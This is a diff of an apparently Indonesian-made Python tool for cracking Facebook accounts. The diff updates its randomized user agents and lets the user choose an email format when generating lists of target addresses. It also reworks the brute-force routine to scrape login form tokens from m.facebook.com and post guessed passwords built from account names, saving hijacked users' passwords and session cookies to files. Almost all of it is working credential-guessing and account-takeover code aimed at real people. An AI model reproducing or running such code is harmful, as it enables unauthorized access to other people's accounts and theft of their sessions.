@@ -47,7 +47,8 @@ versi_app = str(random.randint(111111111,999999999))
 for z in range(200):
 	versi_android = str(random.randint(4,12))+".0.0"
 	versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
-	ua = f"Dalvik/2.1.0 (Linux; U; Android {versi_android} ; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{versi_app};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBBD/L-03K;FBDV/L-03K;FBSV/{versi_android} ;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.75,width=1080,height=2179};FB_FW/1;])"
+	ua = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; vivo 1606 Build/MMB29M) [FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/181448449;FBDM/"+"{density=1.5,width=540,height=960};"+"FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.mlite;FBDV/vivo 1606;FBSV/{versi_android};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+#[FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{versi_app};FBCR/Airtel;FBMF/Facebook/lge;FBBD/FEVER;FBDV/FEVER;FBSV/{versi_android};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.75,width=1080,height=2179};FB_FW/1;])"
 	if ua in ugent:pass
 	else:ugent.append(ua)
 	
@@ -76,9 +77,9 @@ class Logo:
   //  \__  |: \.        |(|  _  \\  // ___)     {P2}██████████████████████[/]
  (:   / "\ |.  \    /:  ||: |_)  :)(:  (      
   \_______)|___|\__/|___|(_______/  \__/      Made By {M2}Indonesia {P2}Coder
-{B2}╭──────────────────────╮{B2}╭───────────────╮{B2}╭────────────────────────────╮
-{B2}│ {P2}Author : Fall Xavier {B2}│{B2}│ {P2}Version : 2.0 {B2}│{B2}│ {P2}Dont't Recode My Tools Bro {B2}│
-{B2}╰──────────────────────╯{B2}╰───────────────╯{B2}╰────────────────────────────╯""",width=80,style=f"{color_panel}"))
+{color_text}╭──────────────────────╮{color_text}╭───────────────╮{color_text}╭────────────────────────────╮
+{color_text}│ {P2}Author : Fall Xavier {color_text}│{color_text}│ {P2}Version : 2.0 {color_text}│{color_text}│ {P2}Dont't Recode My Tools Bro {color_text}│
+{color_text}╰──────────────────────╯{color_text}╰───────────────╯{color_text}╰────────────────────────────╯""",width=80,style=f"{color_panel}"))
 	
 ###----------[ BAGIAN LOGIN ]---------- ###
 class Login:
@@ -210,10 +211,11 @@ class Menu:
 			
 		###----------[ KOMENTAR ]---------- ###
 		elif menu in["4","04"]:
-			prints(Panel(f"""{P2}masukan nama untuk email, format email akan selalu @gmail.com""",width=80,style=f"{color_panel}"))
+			prints(Panel(f"""{P2}masukan nama dan format email gunakan '@' di awal contoh @gmail.com""",width=80,style=f"{color_panel}"))
 			user = console.input(f" {H2}• {P2}masukan nama : ")
+			format = console.input(f" {H2}• {P2}masukan format : ")
 			limit = console.input(f" {H2}• {P2}masukan limit : ")
-			Dump(cookie).Dump_Email(user,limit)
+			Dump(cookie).Dump_Email(user,format,limit)
 			Crack().atursandi()
 			
 		###----------[ PENCARIAN NAMA ]---------- ###
@@ -350,10 +352,13 @@ class Dump:
 		except:pass
 		
 	###----------[ DUMP FILE ]---------- ###
-	def Dump_Email(self,nama,limit):
+	def Dump_Email(self,nama,format,limit):
 		try:
 			for z in range(int(limit)):
-				email = nama+str(z)+"@gmail.com<=>"+nama
+				if len(nama.split()) > 1:
+					email = str(nama.split()[0])+str(nama.split()[1])+str(z)+str(format)+"<=>"+str(nama.split()[0])+" "+str(nama.split()[1])
+				else:
+					email = str(nama)+str(z)+str(format)+"<=>"+str(nama)
 				if email in tampung:pass
 				else:tampung.append(email)
 		except:pass
@@ -421,7 +426,6 @@ class Crack:
 								pass 
 							else:
 								pwx.append(depan+"123")
-								pwx.append(depan+"1234")
 								pwx.append(depan+"12345")
 						else:
 							if len(depan)<3:
@@ -453,34 +457,44 @@ class Crack:
 			for pw in pwx:
 				pw = pw.lower()
 				ua = random.choice(ugent)
+				link = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
 				params = {
-					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
-					"sdk_version": {random.randint(1,26)}, 
-					"email": email,
-					"locale": "en_US",
-					"password": pw,
-					"sdk": "android",
-					"generate_session_cookies": "1",
-					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
+					"m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
+                    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
+                    "try_number": "0",
+                    "unrecognized_tries": "0",
+                    "email": email,
+                    "prefill_contact_point": f"{email} {pw}",
+                    "prefill_source": "browser_dropdown",
+                    "prefill_type": "password",
+                    "first_prefill_source": "browser_dropdown",
+                    "first_prefill_type": "contact_point",
+                    "had_cp_prefilled": True,
+                    "had_password_prefilled": True,
+                    "is_smart_lock": False,
+                    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
+                    "bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
+                    "encpass": f"#PWD_BROWSER:0:{str(mek()).split('.')[0]}:{pw}",
+                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
+                    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
 				}
 				headers = {
 					"Host": "m.facebook.com",
-                "cache-control": "max-age=0",
-                "upgrade-insecure-requests": '"1"',
-                "origin": "https://m.facebook.com",
-                "content-type": "application/x-www-form-urlencoded",
-                "user-agent": ua,
-                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-                "x-requested-with": "mark.via.gp",
-                "sec-fetch-site": "same-origin",
-                "sec-fetch-mode": "navigate",
-                "sec-fetch-user": "?1",
-                "sec-fetch-dest": "document",
-				"referer": "https://m.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin&ref=dbl&fl&login_from_aymh=1&refid=9",
-				"accept-encoding": "gzip, deflate, br",
-				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+                    "content-length": f"{str(len(params))}",
+                    "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
+                    "user-agent": ua,
+                    "content-type": "application/x-www-form-urlencoded",
+                    "accept": "*/*",
+                    "origin": "https://m.facebook.com",
+                    "x-requested-with": "mark.via.gp",
+                    "sec-fetch-site": "same-origin",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-dest": "empty",
+                    "referer": "https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1",
+                    "accept-encoding": "gzip, deflate",
+                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
 				}
-				post = ses.post("https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl",params=params, headers=headers, allow_redirects=False)
+				post = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",params=params, headers=headers, allow_redirects=False)
 				if "session_key" in post.text and "EAA" in post.text:
 					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
 					user = re.findall("c_user=(\d+)",coki)[0]
@@ -488,20 +502,19 @@ class Crack:
 						break
 					else:
 						self.ok.append(user)
-						tree = Tree("                                 ")
+						tree = Tree(" ",guide_style=f"{color_panel}")
 						tree.add(f"\r{H2}{user}|{pw}{P2} ")
-						tree.add(f"{H2}{coki}{P2}")
+						tree.add(Panel(f"{H2}{coki}{P2}",style=f"{color_panel}"))
 						prints(tree)
 						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{coki}\n")
 						break
 				elif "User must verify their account" in post.text:
-					jason = post.json()["error_data"].encode("utf-8")
-					user = re.findall('"uid":(.*),"show_native_checkpoints"', jason)[0]
+					user = post.json()["error"]["error_data"]["uid"]
 					if user in self.ok or user in self.cp:
 						break
 					else:
 						self.cp.append(user)
-						tree = Tree("                                 ")
+						tree = Tree(" ",guide_style=f"{color_panel}")
 						tree.add(f"\r{K2}{user}|{pw}{P2} ")
 						prints(tree)
 						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
@@ -583,11 +596,11 @@ class Lain:
 		for akun in totalhasil:
 			user = akun.split("|")[0]
 			pw = akun.split("|")[1]
-			tree = Tree(" ")
+			tree = Tree(" ",guide_style=f"{color_panel}")
 			if folder=="OK":
 				cookie = akun.split("|")[2]
 				tree.add(f"\r{H2}{user}|{pw}{P2} ")
-				tree.add(f"{H2}{cookie}{P2}")
+				tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
 			else:
 				tree.add(f"\r{K2}{user}|{pw}{P2} ")
 			prints(tree)
@@ -652,4 +665,3 @@ if __name__=="__main__":
 	except:pass
 	Menu().menu()
 #Gunakan Facebook dalam mode dasar dengan Telkomsel
-
